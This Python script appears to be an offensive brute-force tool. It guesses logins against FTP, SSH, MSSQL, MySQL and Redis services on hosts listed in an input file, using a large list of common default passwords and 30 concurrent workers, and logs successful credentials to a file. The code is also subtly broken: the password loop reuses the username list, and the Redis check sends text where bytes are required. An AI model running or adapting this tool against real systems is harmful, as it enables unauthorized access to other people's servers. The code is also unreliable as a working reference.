# -*- coding:utf-8 -*-
import socket
import gevent
from gevent import monkey
monkey.patch_all()
import queue
import pymssql
import ftplib
import paramiko
import pymysql
from threading import Thread
from threading import Lock
from random import shuffle
from time import time
from time import sleep
from sys import argv
import traceback


lock = Lock()

output_name = 'succ' + '_' + str(int(time())) + '.txt'
task_sum = 0

global_time_out = 3
task_list = []
task_queue = queue.Queue()
rest_queue = queue.Queue()
count_queue = queue.Queue()

socket.setdefaulttimeout(global_time_out)

banner = '''
 _____   _____   _____       ___  ___  
|  _  \ /  _  \ /  _  \     /   |/   | 
| |_| | | | | | | | | |    / /|   /| | 
|  _  { | | | | | | | |   / / |__/ | | 
| |_| | | |_| | | |_| |  / /       | | 
|_____/ \_____/ \_____/ /_/        |_| 
'''

start_time = time()

portService = {
    '21':'ftp',
    '22':'ssh',
    '1433':'mssql',
    '3306':'mysql',
    # '3389':'rdp',
    '6379':'redis',
}


pass_dicts = {
    'ftp':
        [
            ['anonymous','ftp','ftpuser','www'],
            ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
        ],
    'ssh':
        [
            ['root','admin'],
            ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
        ],
    'mssql':
        [
            ['sa'],
            ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
        ],
    'mysql':
        [
            ['root'],
            ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
        ],
    # 'rdp':
    #     [
    #         ['administrator','admin'],
    #         ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
    #     ],
    'redis':
        [
            ['admin'],
            ['','root','!@','wubao','password','123456','admin','12345','1234','p@ssw0rd','123','1','jiamima','test','root123','!','!q@w','!qaz@wsx','idc!@','admin!@','alpine','qwerty','12345678','111111','123456789','1q2w3e4r','123123','default','1234567','qwe123','1qaz2wsx','1234567890','abcd1234','000000','user','toor','qwer1234','1q2w3e','asdf1234','redhat','1234qwer','cisco','12qwaszx','test123','1q2w3e4r5t','admin123','changeme','1qazxsw2','123qweasd','q1w2e3r4','letmein','server','root1234','master','abc123','rootroot','a','system','pass','1qaz2wsx3edc','p@$$w0rd','112233','welcome','!QAZ2wsx','linux','123321','manager','1qazXSW@','q1w2e3r4t5','oracle','asd123','admin123456','ubnt','123qwe','qazwsxedc','administrator','superuser','zaq12wsx','121212','654321','ubuntu','0000','zxcvbnm','root@123','1111','vmware','q1w2e3','qwerty123','cisco123','11111111','pa55w0rd','asdfgh','11111','123abc','asdf','centos','888888','54321','password123']
        ]
}

def init_task_queue():
    for task_line in open(argv[1], 'r+').readlines():
        task_line = task_line.strip()
        if ':' not in task_line:
            continue
        if len(task_line.split(':')) == 2:
            aports = task_line.split(':')
            protocol = portService[str(aports[1])]
            for user in pass_dicts[protocol][0]:
                for password in pass_dicts[protocol][0]:
                    task_list.append([protocol,aports[0],aports[1],user,password])
        elif len(task_line.split(':')) == 3:
            aports = task_line.split(':')
            protocol = aports[0]
            for user in pass_dicts[protocol][0]:
                for password in pass_dicts[protocol][0]:
                    task_list.append([protocol,aports[1],aports[2],user,password])
        else:
            continue
    shuffle(task_list)
    for line in task_list:
        task_queue.put(line)
    task_list.clear()
    global task_sum
    task_sum = task_queue.qsize()

class Crack():
    def __init__(self):
        pass
    def module_mssql_crack(self,host, port, username, password):
        try:
            db = pymssql.connect(server=host, port=str(port), user=username, password=password,login_timeout=global_time_out)
            if db:
                return True
            else:
                return False
        except:
            traceback.print_exc(file=open('error.log','a+'))
            return False
    def module_ftp_crack(self,host, port, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.timeout = global_time_out
            ftp.connect(host,int(port))
            ftp.login(username,password)
            return True
        except:
            traceback.print_exc(file=open('error.log', 'a+'))
            return False
    def module_ssh_crack(self,host, port, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=int(port), username=username, password=password,banner_timeout=30)
            client.close()
            return True
        except:
            traceback.print_exc(file=open('error.log', 'a+'))
            return False
    def module_redis_crack(self,host, port, username, password):
        try:
            socket.setdefaulttimeout(global_time_out)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send("AUTH %s\r\n" % (password))
            result = s.recv(1024)
            if b'+OK' in result:
                return True
            else:
                return False
        except:
            return False
    # def module_rdp_crack(self,host, port, username, password):
    #     if int(port) != 3389:
    #         return False
    #     try:
    #         WMI(computer=host, user=username, password=password)
    #         return True
    #     except:
    #         traceback.print_exc(file=open('error.log', 'a+'))
    #         return False
    def module_mysql_crack(self,host, port, username, password):
        try:
            pymysql.connect(host=host,port=int(port),user=username,password=password,database="mysql")
            return True
        except:
            traceback.print_exc(file=open('error.log', 'a+'))
            return False

def run():
    while not task_queue.empty():
        try:
            crack = Crack()
            task = task_queue.get(block=False,timeout=0.1)
            protocol = task[0]
            host = task[1]
            port = task[2]
            user = task[3]
            passw = task[4]
            if getattr(crack,"module_{}_crack".format(protocol))(host,port,user,passw):
                count_queue.put('222')
                lock.acquire()
                with open(output_name,'a+') as f:
                    f.write('{} {} {} {} {}\n'.format(protocol,host,str(port),user,passw))
                lock.release()
        except queue.Empty:
            break
        except:
            pass

def realtimeprogress():
    sleep(1)
    while True:
        if task_queue.empty():
            sleep(2)
            break
        else:
            print("[-] Time used {}s, Process {}/{}, {} Success".format(int(time()-start_time),task_sum - task_queue.qsize(),task_sum,count_queue.qsize()), end='\r')
        sleep(1)

if __name__=='__main__':
    print(banner)
    print()
    sleep(0.5)
    init_task_queue()
    Thread(target=realtimeprogress,args=()).start()
    pool = [gevent.spawn(run) for i in range(30)]
    gevent.joinall(pool)

